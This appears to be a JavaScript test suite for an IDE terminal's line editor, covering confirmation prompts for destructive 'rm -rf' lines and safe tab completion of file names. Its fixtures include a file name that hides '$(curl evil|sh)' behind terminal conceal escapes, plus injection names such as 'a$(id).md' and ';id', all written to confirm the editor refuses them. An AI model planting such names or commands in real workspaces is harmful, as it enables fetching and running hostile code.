// Assertions driven against the workbench's real line-by-line terminal,
// spliced in above this file's contents by ide_test.go.
let ok = true;
function check(label, pass){
  console.log((pass ? 'PASS' : 'FAIL') + '  ' + label);
  ok = ok && pass;
}
const tick = () => new Promise(r => setTimeout(r, 5));
// wrapped is how many rows above the cursor the terminal shows the line wrapped onto.
// pending, when given, collects write callbacks instead of running them, as a terminal still drawing would.
const term = (wrapped = 0, pending = null) => {
  const out = [], buffer = {active:{baseY:0, cursorY:wrapped, getLine:y => ({isWrapped:y > 0 && y <= wrapped})}};
  const write = (s, done) => { if(s) out.push(s); if(done) pending ? pending.push(done) : done(); };
  return {out, t:{term:{write, cols:80, rows:24, buffer}, line:'', queue:[], hist:[], at:0, cwd:'.', mode:'lines'}};
};
const CONFIRM = {confirm:'recursive/forced delete — always requires confirmation', cwd:'.'};

// y runs the line, sent again with confirmed; the prompt says why.
let {out, t} = term();
__sent.length = 0; __replies.push(CONFIRM, {id:'u2', cwd:'.'});
linesData(t, 'rm -rf x\r'); await tick();
check('a destructive line is sent once, with no answer', __sent.length === 1 && !('confirmed' in __sent[0]) && !('declined' in __sent[0]));
check('the prompt shows the reason and asks', t.confirm === 'rm -rf x' && out.join('').includes('always requires confirmation') && out.join('').includes('Run it? [y/N]'));
check('arrow keys do nothing at the prompt', lineKeys(t, {type:'keydown', key:'ArrowUp'}) === false && t.line === '');
linesData(t, 'y'); linesData(t, '\r'); await tick();
check('y sends it again, confirmed', __sent.length === 2 && __sent[1].confirmed === true && !('declined' in __sent[1]) && __sent[1].command === 'rm -rf x');
check('a confirmed line runs', __attached === 'u2' && !t.confirm);
check('the line is in the history once', t.hist.length === 1);

// Anything but y declines, and clears the lines queued behind it.
for(const answer of ['yes\r', '\r', 'n\r', '\x03']){
  ({out, t} = term());
  __sent.length = 0; __attached = null; __replies.push(CONFIRM, {id:'u3', denied:'Not run: not confirmed', cwd:'.'});
  linesData(t, 'rm -rf x\recho next\r'); await tick();
  check(JSON.stringify(answer) + ': one line waits behind the prompt', t.queue.length === 1);
  linesData(t, answer); await tick();
  check(JSON.stringify(answer) + ' declines', __sent.length === 2 && __sent[1].declined === true && !('confirmed' in __sent[1]));
  check(JSON.stringify(answer) + ' runs nothing and drops the queue', __attached === null && t.queue.length === 0 && __sent.every(b => b.command !== 'echo next'));
}

// Type-ahead that was not entered survives the prompt.
({out, t} = term());
__sent.length = 0; __replies.push(CONFIRM, {id:'u4', cwd:'.'});
linesData(t, 'rm -rf x\r'); t.line = 'git st'; await tick();
check('type-ahead is set aside at the prompt', t.confirm && t.line === '');
linesData(t, 'y\r'); await tick();
check('type-ahead comes back after the answer', t.line === 'git st');

// An ordinary line runs on Enter, as before.
({out, t} = term());
__sent.length = 0; __attached = null; __replies.push({id:'u5', cwd:'.'});
linesData(t, 'ls\r'); await tick();
check('an ordinary line runs on Enter', __sent.length === 1 && __attached === 'u5' && !t.confirm);

// While a program runs, its keys go to it exactly as typed: nothing is judged,
// queued or echoed by the line editor.
({out, t} = term());
__sent.length = 0; __input.length = 0; t.run = 'u6';
for(const k of ['i', 'hi', '\x1b', ':wq\r', '\x03', '\x1b[A', '\t']) linesData(t, k);
check('a running program is sent every key raw', JSON.stringify(__input) === JSON.stringify(['i', 'hi', '\x1b', ':wq\r', '\x03', '\x1b[A', '\t']));
check('nothing is judged, queued or echoed meanwhile', __sent.length === 0 && t.queue.length === 0 && t.line === '' && out.length === 0);
const key = k => { let stopped = false; return {e:{type:'keydown', key:k, shiftKey:false, preventDefault(){ stopped = true; }}, stopped:() => stopped}; };
check('Esc, arrows, Tab and Enter are left to the terminal for the program',
  ['Escape', 'ArrowUp', 'ArrowDown', 'ArrowLeft', 'Tab', 'Enter'].every(k => { const {e, stopped} = key(k); return lineKeys(t, e) === true && !stopped(); }));
t.run = null;

// Back at the line editor, Esc and the arrows that are not history add nothing to the line.
({out, t} = term());
linesData(t, 'ls\x1b\x1b[D\x1b[C\x1bOA -l\x1b[I');
check('escape sequences are not text for the line', t.line === 'ls -l');

// Tab completes the last word against the listing of the terminal's directory.
__tree = {'': [{name:'src', dir:true}, {name:'test.md'}, {name:'tests', dir:true}, {name:'.env'}], 'src': [{name:'main.go'}, {name:'mail.go'}], 'app/src': [{name:'x.go'}]};
({out, t} = term());
linesData(t, 'vi te');
let k = key('Tab');
check('Tab stays in the terminal', lineKeys(t, k.e) === false && k.stopped());
await tick();
check('a shared prefix completes as far as it goes', t.line === 'vi test');
lineKeys(t, key('Tab').e); await tick();
check('a second Tab lists the candidates', out.join('').includes('test.md  tests/') && t.line === 'vi test' && out.join('').endsWith('$\x1b[0m vi test'));
linesData(t, '.'); lineKeys(t, key('Tab').e); await tick();
check('one match completes, with a space after a file', t.line === 'vi test.md ');

({out, t} = term());
linesData(t, 'cd sr'); lineKeys(t, key('Tab').e); await tick();
check('a directory completes with a slash', t.line === 'cd src/');
linesData(t, 'mai'); __listed.length = 0; lineKeys(t, key('Tab').e); await tick();
check('a word with a path is completed inside that directory', __listed[0] === 'src' && t.line === 'cd src/mai');

({out, t} = term()); t.cwd = 'app';
linesData(t, 'cat src/'); __listed.length = 0; lineKeys(t, key('Tab').e); await tick();
check('completion starts from the terminal\'s directory', __listed[0] === 'app/src' && t.line === 'cat src/x.go ');

({out, t} = term());
linesData(t, 'cat .e'); lineKeys(t, key('Tab').e); await tick();
check('a hidden name completes only when asked for', t.line === 'cat .env ');
({out, t} = term());
linesData(t, 'cat /et'); __listed.length = 0; lineKeys(t, key('Tab').e); await tick();
check('a path outside the workspace is not looked up', __listed.length === 0 && t.line === 'cat /et');
({out, t} = term());
linesData(t, 'vi nothing'); lineKeys(t, key('Tab').e); await tick(); lineKeys(t, key('Tab').e); await tick();
check('no match changes nothing', t.line === 'vi nothing' && !out.join('').includes('\r\n'));

// Names are chosen by whoever wrote the workspace, the agent included. One
// that could hide or reorder what is shown is never offered, and the rest
// go in quoted, so the line sent is the line on screen.
const RLO = String.fromCharCode(0x202e), ZWSP = String.fromCharCode(0x200b);
__tree.evil = [{name:'notes.md\x1b[8m;$(curl evil|sh)\x1b[0m'}, {name:'notes\n.md'}, {name:'notes' + RLO + 'dm.txt'}, {name:'notes' + ZWSP + '.md'}, {name:'notes.txt'}];
({out, t} = term()); t.cwd = 'evil';
linesData(t, 'cat notes'); lineKeys(t, key('Tab').e); await tick();
check('a name with control or bidi characters is never offered', t.line === 'cat notes.txt ');
({out, t} = term()); t.cwd = 'evil';
__tree.evil.pop();
linesData(t, 'cat notes'); lineKeys(t, key('Tab').e); await tick(); lineKeys(t, key('Tab').e); await tick();
check('nor completed or listed when it is all there is', t.line === 'cat notes' && !out.join('').includes('curl') && !out.join('').includes(RLO));

__tree.q = [{name:'my notes.md'}, {name:'a$(id).md'}, {name:'x y.md'}, {name:'x;z.md'}];
({out, t} = term()); t.cwd = 'q';
linesData(t, 'cat my'); lineKeys(t, key('Tab').e); await tick();
check('a space in a name is quoted', t.line === 'cat my\\ notes.md ' && out.join('').endsWith('\\ notes.md '));
({out, t} = term()); t.cwd = 'q';
linesData(t, 'cat a'); lineKeys(t, key('Tab').e); await tick();
check('shell syntax in a name is quoted', t.line === 'cat a\\$\\(id\\).md ');
({out, t} = term()); t.cwd = 'q';
linesData(t, 'cat my\\ n'); lineKeys(t, key('Tab').e); await tick();
check('a word typed with quoting completes', t.line === 'cat my\\ notes.md ');
({out, t} = term()); t.cwd = 'q';
linesData(t, 'cat x'); lineKeys(t, key('Tab').e); await tick(); lineKeys(t, key('Tab').e); await tick();
check('the listing shows names quoted', out.join('').includes('x\\ y.md  x\\;z.md'));

({out, t} = term());
linesData(t, 'go build -o=te'); lineKeys(t, key('Tab').e); await tick();
check('the word after = completes', t.line === 'go build -o=test');
({out, t} = term());
linesData(t, 'echo $te'); __listed.length = 0; lineKeys(t, key('Tab').e); await tick();
check('a word after $ is not completed', __listed.length === 0 && t.line === 'echo $te');

// Where the shell would read a name differently, inside quotes, backticks or
// $( or after a lone backslash, nothing is completed.
__tree.ctx = [{name:';id'}, {name:'a\\;id'}, {name:'-rf'}, {name:'plain.txt'}];
for(const typed of ['cat \\', 'echo `cat a', "cat 'a", 'cat "a', 'echo $(cat a', 'echo "`cat a', 'echo "$(cat a']){
  ({out, t} = term()); t.cwd = 'ctx';
  linesData(t, typed); __listed.length = 0; lineKeys(t, key('Tab').e); await tick(); lineKeys(t, key('Tab').e); await tick();
  check(JSON.stringify(typed) + ' is left as typed', t.line === typed && __listed.length === 0 && !out.join('').includes('id'));
}
for(const [typed, want] of [['echo "x" `true` $(true) pl', 'echo "x" `true` $(true) plain.txt '], ["echo 'it\"s' pl", "echo 'it\"s' plain.txt "]]){
  ({out, t} = term()); t.cwd = 'ctx';
  linesData(t, typed); lineKeys(t, key('Tab').e); await tick();
  check(JSON.stringify(typed) + ': closed quoting before the word still completes', t.line === want);
}
({out, t} = term()); t.cwd = 'ctx';
linesData(t, 'rm -'); lineKeys(t, key('Tab').e); await tick();
check('a name starting with - goes in as ./-name, redrawn whole', t.line === 'rm ./-rf ' && out.join('').endsWith('\r\x1b[J\x1b[2m(line by line)\x1b[0m \x1b[36mctx $\x1b[0m rm ./-rf '));

// In $'...' a backslash escapes the quote, so the string is still open.
({out, t} = term()); t.cwd = 'ctx';
linesData(t, "echo $'a\\' b pl"); __listed.length = 0; lineKeys(t, key('Tab').e); await tick();
check("$'a\\' b leaves the ANSI-C quote open", t.line === "echo $'a\\' b pl" && __listed.length === 0);
({out, t} = term()); t.cwd = 'ctx';
linesData(t, "echo $'a\\'b' pl"); lineKeys(t, key('Tab').e); await tick();
check("a closed $'...' still completes after it", t.line === "echo $'a\\'b' plain.txt ");

// A redraw climbs the rows the terminal wrapped the line onto, as it drew
// them: however wide it drew a character, the count comes from its buffer.
({out, t} = term(1)); t.cwd = 'ctx';
const wide = String.fromCodePoint(0x65e5, 0x672c).repeat(15);
linesData(t, 'echo ' + wide + ' -'); lineKeys(t, key('Tab').e); await tick();
check('a wrapped line is redrawn from the row it starts on', t.line === 'echo ' + wide + ' ./-rf ' && out.join('').endsWith('\x1b[1A\r\x1b[J\x1b[2m(line by line)\x1b[0m \x1b[36mctx $\x1b[0m echo ' + wide + ' ./-rf '));
const rocket = String.fromCodePoint(0x1f680);
__tree.rocket = [{name:'-' + rocket + 'launch.md'}];
for(const rows of [0, 2]){
  ({out, t} = term(rows)); t.cwd = 'rocket';
  linesData(t, 'cat ' + rocket.repeat(30) + ' -'); lineKeys(t, key('Tab').e); await tick();
  const drawn = out.join('');
  check('an emoji name at a wrap of ' + rows + ' rows climbs exactly those rows', t.line === 'cat ' + rocket.repeat(30) + ' ./-' + rocket + 'launch.md ' &&
    drawn.endsWith((rows ? '\x1b[' + rows + 'A' : '') + '\r\x1b[J\x1b[2m(line by line)\x1b[0m \x1b[36mrocket $\x1b[0m ' + t.line) && (rows || !drawn.includes('A\r\x1b[J')));
}

// Hangul fillers and other invisible or ignorable characters are never offered either.
__tree.ign = [{name:'x' + String.fromCharCode(0x3164) + '.md'}, {name:'x' + String.fromCharCode(0xa0) + '.md'}, {name:'x' + String.fromCharCode(0x3000) + '.md'}, {name:'x' + String.fromCharCode(0xad) + '.md'}, {name:'x' + String.fromCharCode(0x2060) + '.md'}, {name:'x.md'}];
({out, t} = term()); t.cwd = 'ign';
linesData(t, 'cat x'); lineKeys(t, key('Tab').e); await tick();
check('ignorable characters are never offered', t.line === 'cat x.md ');

// The shared prefix is cut by whole characters, never half of one.
__tree.emoji = [{name:String.fromCodePoint(0x1f600) + 'a'}, {name:String.fromCodePoint(0x1f603) + 'b'}];
({out, t} = term()); t.cwd = 'emoji';
linesData(t, 'cat '); lineKeys(t, key('Tab').e); await tick();
check('no half character is completed', t.line === 'cat ' && !/[\ud800-\udfff]/.test(out.join('')));

// Keys typed while a redraw waits for the terminal are held, then land after it.
{
  const pending = [];
  ({out, t} = term(0, pending)); t.cwd = 'ctx';
  linesData(t, 'rm -'); lineKeys(t, key('Tab').e); await tick();
  linesData(t, 'x');
  check('a key typed during a redraw waits', t.line === 'rm ./-rf ' && !out.join('').endsWith('x'));
  pending.splice(0).forEach(f => f());
  check('and lands after the redrawn line', t.line === 'rm ./-rf x' && out.join('').endsWith('\x1b[36mctx $\x1b[0m rm ./-rf x'));
}
// History and Tab wait too: the line on screen and the line that would run stay the same.
{
  const pending = [];
  ({out, t} = term(0, pending)); t.cwd = 'ctx'; t.hist = ['echo hi']; t.at = 1;
  linesData(t, 'rm -'); lineKeys(t, key('Tab').e); await tick();
  __listed.length = 0;
  const up = key('ArrowUp'), tab = key('Tab');
  check('ArrowUp during a redraw is ignored', lineKeys(t, up.e) === false && t.line === 'rm ./-rf ' && t.at === 1);
  check('Tab during a redraw starts nothing', lineKeys(t, tab.e) === false && tab.stopped() && (await tick(), __listed.length === 0));
  pending.splice(0).forEach(f => f());
  check('the line shown is the line held', t.line === 'rm ./-rf ' && out.join('').endsWith('\x1b[36mctx $\x1b[0m ' + t.line));
  check('history works again after it', lineKeys(t, key('ArrowUp').e) === false && t.line === 'echo hi');
}
check('only a space or a tab ends the cd word', isPlainCd('cd\tx') && isPlainCd('cd x') && !isPlainCd('cd' + String.fromCharCode(0xa0) + 'x'));

// A cd with an ANSI-C quote is a plain cd too: the server follows it without a shell.
({out, t} = term());
__sent.length = 0; __attached = null; __replies.push({id:'u10', cwd:'a b'});
linesData(t, "cd $'a b'\r"); await tick();
check("cd $'...' is followed without a terminal", __sent[0].command === "cd $'a b'" && __attached === null && t.cwd === 'a b');

// A completed folder with a space is cd'd into, and the prompt then shows it.
__tree.packages = [{name:'web app', dir:true}];
({out, t} = term());
__sent.length = 0; __replies.push({id:'u8', cwd:'packages/web app'});
linesData(t, 'cd packages/we'); lineKeys(t, key('Tab').e); await tick();
check('the folder completes quoted', t.line === 'cd packages/web\\ app/');
linesData(t, '\r'); await tick();
check('the quoted cd is sent as shown and the prompt moves there', __sent[0].command === 'cd packages/web\\ app/' && t.cwd === 'packages/web app' &&
  out.join('').endsWith('\x1b[36mpackages/web app $\x1b[0m '));
// A cd the server did not follow says so, and the prompt stays where it was.
({out, t} = term());
__replies.push({id:'u9', cwd:'.', note:'cd: no such directory: gone\x1b[8m; still in .'});
linesData(t, 'cd gone\r'); await tick();
check('a cd that was not followed says why', out.join('').includes('\x1b[33mcd: no such directory: gone?[8m; still in .\x1b[0m') && t.cwd === '.');

// A pasted line with an unfinished escape in it still ends at its line break.
({out, t} = term());
__sent.length = 0; __replies.push({cwd:'.'}, {cwd:'.'});
linesData(t, 'echo a\x1b]junk\recho b\x1b\r'); await tick(); await tick();
check('an unfinished escape does not swallow the next line', __sent.map(b => b.command).join('|') === 'echo a|echo b');

// The [y/N] prompt still takes only its answer: no completion, no raw keys.
({out, t} = term());
__sent.length = 0; __listed.length = 0; __replies.push(CONFIRM, {id:'u7', cwd:'.'});
linesData(t, 'rm -rf te\r'); await tick();
k = key('Tab');
check('Tab at the prompt completes nothing and keeps focus', lineKeys(t, k.e) === false && k.stopped() && (await tick(), __listed.length === 0) && t.line === '');
linesData(t, '\x1b[A'); linesData(t, '\x1b');
check('escape keys at the prompt are ignored', t.line === '' && t.confirm === 'rm -rf te');
linesData(t, 'y\r'); await tick();
check('the prompt still runs on y', __sent.length === 2 && __sent[1].confirmed === true && __attached === 'u7');

// An escape key arriving with the answer is dropped, not taken as the answer.
({out, t} = term());
__sent.length = 0; __replies.push(CONFIRM, {id:'u11', cwd:'.'});
linesData(t, 'rm -rf te\r'); await tick();
linesData(t, 'y\x1b[A\x1b[D\r'); await tick();
check('y with arrows mixed in still confirms, and the arrows are no text', __sent.length === 2 && __sent[1].confirmed === true);

// While a line is still being judged, history keys wait.
({out, t} = term()); t.hist = ['echo hi']; t.at = 1; t.busy = true;
check('ArrowUp while a line runs is ignored', lineKeys(t, key('ArrowUp').e) === false && t.line === '' && t.at === 1);
t.busy = false; t.queue = [{cmd:'ls', shown:false}];
check('and while lines wait in the queue', lineKeys(t, key('ArrowUp').e) === false && t.line === '');

process.exit(ok ? 0 : 1);
